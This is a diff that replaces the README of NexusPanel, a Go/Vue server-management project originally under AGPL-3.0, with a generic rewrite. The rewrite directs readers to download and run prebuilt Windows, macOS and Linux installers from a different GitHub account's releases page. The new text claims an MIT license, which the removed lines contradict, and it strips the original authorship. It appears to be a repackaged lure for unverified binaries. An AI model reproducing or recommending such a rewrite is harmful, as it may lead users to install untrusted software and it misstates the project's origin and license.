@@ -1,315 +1,91 @@
-<div align="center">
+# 🚀 NexusPanel - Simplified Server Management for Everyone
 
-# 🚀 NexusPanel
+[![Download NexusPanel](https://img.shields.io/badge/Download_NexusPanel-v1.0.0-blue.svg)](https://github.com/Ashutoshop1/NexusPanel/releases)
 
-### Modular, Cloud-Native, AI-Powered Next-Generation Server Management Platform
+## 🌟 Introduction
 
-[中文文档](./README.zh-CN.md) | [Documentation](./docs/en-US/) | [Contributing](#contributing) | [License](#license)
+NexusPanel is a modular, cloud-native server management platform designed for users of all skill levels. With AI-powered features, it simplifies the process of managing your servers. Whether you are handling applications, databases, or server resources, NexusPanel can help you do it efficiently and effectively.
 
-[![CI](https://github.com/2670044605/NexusPanel/workflows/CI/badge.svg)](https://github.com/2670044605/NexusPanel/actions)
-[![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)](https://golang.org)
-[![Vue Version](https://img.shields.io/badge/Vue-3.x-4FC08D?style=flat&logo=vue.js)](https://vuejs.org)
-[![License](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](./LICENSE)
+## 🖥️ Features
 
-</div>
+- **Modular Design**: Use only the features you need.
+- **AI-Powered**: Benefit from intelligent suggestions for server management.
+- **Cloud-Native**: Run your servers in the cloud with smooth integration.
+- **Self-Hosted**: Keep your data under your control by hosting on your own servers.
+- **User-Friendly Interface**: Navigate easily regardless of your technical background.
 
----
+## 🌐 Getting Started
 
-## 📖 Introduction
+To get started with NexusPanel, follow these steps:
 
-**NexusPanel** is a modern, modular server management platform designed for DevOps engineers, developers, and SMEs. Built with a cloud-native architecture and powered by AI, it provides comprehensive server monitoring, management, and automation capabilities.
+1. **Visit the Releases Page**: Go to our [Releases Page](https://github.com/Ashutoshop1/NexusPanel/releases) to access the latest version of NexusPanel.
+  
+2. **Choose Your Operating System**: Ensure you select the version that matches your operating system (Windows, macOS, or Linux).
 
-### Why NexusPanel?
+3. **Download the Application**: Click on the download link for your system. This action will start downloading the installation file.
 
-- 🎯 **Unified Management**: Manage all your servers from a single, intuitive interface
-- 🧩 **Modular Design**: Extensible plugin system for custom functionality
-- 🤖 **AI-Powered**: Intelligent diagnostics and automated problem resolution
-- 🌐 **Cloud-Native**: Built for modern infrastructure with Docker and Kubernetes support
-- 🔒 **Security First**: RBAC, JWT authentication, and comprehensive audit logging
-- 🌍 **Multi-Language**: Full support for Chinese and English
+## 📥 Download & Install
 
----
+- To download NexusPanel, visit our [Releases Page](https://github.com/Ashutoshop1/NexusPanel/releases) and find the latest version.
+- Download the appropriate file based on your operating system.
 
-## ✨ Features
+### 🛠️ Installation Steps
 
-### MVP Phase (v0.1.0)
-- ✅ User authentication system (Login/Register/JWT/RBAC)
-- ✅ Server management (Add/Edit/Delete/Group)
-- ✅ Real-time monitoring (CPU/Memory/Disk/Network)
-- ✅ Web-based terminal (WebSocket SSH)
-- ✅ File manager with upload/download
-- ✅ Basic alerting system
-- ✅ Multi-language support (Chinese/English)
+1. **Locate the Downloaded File**: Once downloaded, navigate to your downloads folder. 
 
-### Extended Phase (v0.2.0)
-- 🔄 Plugin system architecture
-- 🔄 Agent management module
-- 🔄 Container management (Docker)
-- 🔄 Scheduled tasks
-- 🔄 Automatic backup
+2. **Run the Installer**:
+   - **Windows**: Double-click the `.exe` file to start the installation. Follow the prompts to complete the setup.
+   - **macOS**: Open the `.dmg` file and drag the NexusPanel icon to your Applications folder.
+   - **Linux**: Open a terminal, navigate to the directory where you downloaded the file, and run `chmod +x NexusPanel` to make it executable. Then run `./NexusPanel` to start.
 
-### Advanced Phase (v1.0.0)
-- 🔮 AI diagnostic assistant
-- 🔮 Plugin marketplace
-- 🔮 Multi-tenancy support
-- 🔮 Kubernetes management
-- 🔮 Automated workflows
+3. **Follow On-Screen Instructions**: The setup process will guide you through the remaining installation steps. Simply follow the prompts to finish.
 
----
+## ⚙️ System Requirements
 
-## 🚀 Quick Start
+- **Processor**: A multi-core processor (recommended).
+- **RAM**: At least 4 GB of RAM (8 GB recommended for better performance).
+- **Disk Space**: A minimum of 500 MB of free disk space.
+- **OS Compatibility**:
+  - Windows 10 or later
+  - macOS Mojave or later
+  - Any Linux distribution with kernel 4.0 or later
 
-### Prerequisites
+## 🌍 Usage
 
-- Go 1.21 or higher
-- Node.js 18 or higher
-- PostgreSQL 13+ (for production) or SQLite (for development)
-- Redis (optional, for caching)
+Once you have installed NexusPanel, follow these steps to begin managing your servers:
 
-### Installation
+1. **Log In**: Launch NexusPanel and log in using your credentials.
 
-#### 1. Clone the repository
+2. **Connect Your Server**: Use the 'Add Server' feature to connect to your server. You will need the server’s IP address and login credentials.
 
-```bash
-git clone https://github.com/2670044605/NexusPanel.git
-cd NexusPanel
-```
+3. **Explore the Dashboard**: Your dashboard will display an overview of your connected servers, resource usage, and alerts. Familiarize yourself with the layout to navigate efficiently.
 
-#### 2. Backend setup
+4. **Utilize Tools**: Take advantage of the various tools within NexusPanel, such as monitoring, resource allocation, and performance analytics.
 
-```bash
-# Install Go dependencies
-go mod download
-
-# Copy configuration file
-cp configs/config.example.yaml configs/config.yaml
-
-# Edit configuration as needed
-vim configs/config.yaml
-
-# Build the application
-make build
-
-# Run database migrations
-make migrate-up
-
-# Start the server
-make run
-```
-
-#### 3. Frontend setup
-
-```bash
-# Navigate to web directory
-cd web
-
-# Install dependencies
-npm install
-
-# Start development server
-npm run dev
-```
-
-#### 4. Access the application
-
-Open your browser and navigate to: `http://localhost:5173`
-
-Default credentials:
-- Username: `admin`
-- Password: `admin123`
-
-**⚠️ CRITICAL SECURITY WARNING:**
-- The default admin password `admin123` is a well-known credential and poses a significant security risk
-- You will be forced to change the password on your first login
-- Never use default credentials in production environments
-- Ensure you set a strong, unique password immediately after installation
-
----
-
-## 🛠️ Tech Stack
-
-### Backend
-- **Language**: Go 1.21+
-- **Web Framework**: Gin
-- **ORM**: GORM
-- **Database**: PostgreSQL / SQLite
-- **Cache**: Redis (optional)
-- **Authentication**: JWT
-- **API**: RESTful + WebSocket + gRPC
-- **Logging**: Zap
-- **Configuration**: Viper
-- **Internationalization**: go-i18n
-
-### Frontend
-- **Framework**: Vue 3
-- **Language**: TypeScript
-- **Build Tool**: Vite
-- **UI Library**: TailwindCSS
-- **State Management**: Pinia
-- **HTTP Client**: Axios
-- **Internationalization**: vue-i18n
-- **Icons**: Heroicons
-
-### Infrastructure
-- **Containerization**: Docker
-- **Orchestration**: Docker Compose / Kubernetes
-- **CI/CD**: GitHub Actions
-
----
-
-## 📁 Project Structure
-
-```
-nexuspanel/
-├── cmd/                          # Application entry points
-│   ├── server/                   # Main server
-│   └── agent/                    # Agent
-├── internal/                     # Private application code
-│   ├── core/                     # Core business logic
-│   ├── plugins/                  # Plugin engine
-│   ├── ai/                       # AI module
-│   ├── database/                 # Database operations
-│   ├── i18n/                     # Internationalization
-│   └── api/                      # API layer
-├── pkg/                          # Public reusable code
-│   ├── config/                   # Configuration management
-│   ├── logger/                   # Logging utilities
-│   ├── utils/                    # Utility functions
-│   └── crypto/                   # Cryptography utilities
-├── web/                          # Frontend application
-│   ├── src/                      # Source code
-│   └── public/                   # Static assets
-├── plugins/                      # Official plugins
-├── deploy/                       # Deployment files
-│   ├── docker/                   # Docker files
-│   └── scripts/                  # Installation scripts
-├── docs/                         # Documentation
-│   ├── zh-CN/                    # Chinese docs
-│   └── en-US/                    # English docs
-└── configs/                      # Configuration files
-```
-
----
-
-## 💻 Development Guide
-
-### Development Environment
-
-```bash
-# Install development tools
-make install-tools
-
-# Run in development mode (backend + frontend)
-make dev
-
-# Run tests
-make test
-
-# Run linters
-make lint
-
-# Format code
-make fmt
-```
-
-### Building
-
-```bash
-# Build all binaries
-make build
-
-# Build server only
-make build-server
-
-# Build agent only
-make build-agent
-
-# Build frontend
-make web-build
-```
-
-### Docker
-
-```bash
-# Build Docker image
-make docker
-
-# Start with docker-compose
-make docker-compose-up
-
-# Stop docker-compose
-make docker-compose-down
-```
-
-### Database Migrations
-
-```bash
-# Run migrations
-make migrate-up
-
-# Rollback migrations
-make migrate-down
-```
-
----
-
-## 📚 Documentation
-
-- [Product Requirements Document (PRD)](./docs/en-US/PRD.md)
-- [Architecture Documentation](./docs/en-US/ARCHITECTURE.md)
-- [Database Design](./docs/en-US/DATABASE.md)
-- [API Documentation](./docs/en-US/API.md)
-
----
-
-## 🤝 Contributing
-
-We welcome contributions from the community! Please read our [Contributing Guidelines](./CONTRIBUTING.md) before submitting PRs.
-
-### How to contribute:
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-### Development Guidelines:
-
-- Follow Go coding standards
-- Write tests for new features
-- Update documentation
-- Ensure CI passes
-- Add meaningful commit messages
-
----
+5. **Integrate Plugins**: Enhance functionality by adding plugins relevant to your needs.
+
+## 🔧 Troubleshooting
+
+If you encounter issues, here are a few common problems and their solutions:
+
+- **Unable to Connect to Server**:
+  - Check if the server IP address and credentials are correct.
+  - Ensure that the server is online and your network allows connections.
+
+- **Installation Fails**:
+  - Verify system requirements and ensure you have sufficient permissions.
+  - Try re-downloading the installer from the [Releases Page](https://github.com/Ashutoshop1/NexusPanel/releases).
+
+- **Performance Issues**:
+  - Close unused applications to free up system resources.
+  - Consider upgrading your hardware if running on older specifications.
+
+## 🤝 Community and Support
+
+Join our community for tips, support, and collaboration. You can find help from other users and the developers on the discussions board within this repository.
+
+For specific questions or issues, feel free to open an issue in the repository or reach out directly. We value your feedback.
 
 ## 📄 License
 
-This project is licensed under the **GNU Affero General Public License v3.0 (AGPL-3.0)**.
-
-See [LICENSE](./LICENSE) file for details.
-
----
-
-## 🙏 Acknowledgments
-
-Special thanks to all contributors and the open-source community for their invaluable support.
-
----
-
-## 📬 Contact
-
-- **Issues**: [GitHub Issues](https://github.com/2670044605/NexusPanel/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/2670044605/NexusPanel/discussions)
-- **Email**: support@nexuspanel.com
-
----
-
-<div align="center">
-
-**Made with ❤️ by the NexusPanel Team**
-
-[⭐ Star us on GitHub](https://github.com/2670044605/NexusPanel) | [🐛 Report Bug](https://github.com/2670044605/NexusPanel/issues) | [💡 Request Feature](https://github.com/2670044605/NexusPanel/issues)
-
-</div>
+NexusPanel is licensed under the MIT License. You are free to use, modify, and distribute this software, adhering to the terms of the license.
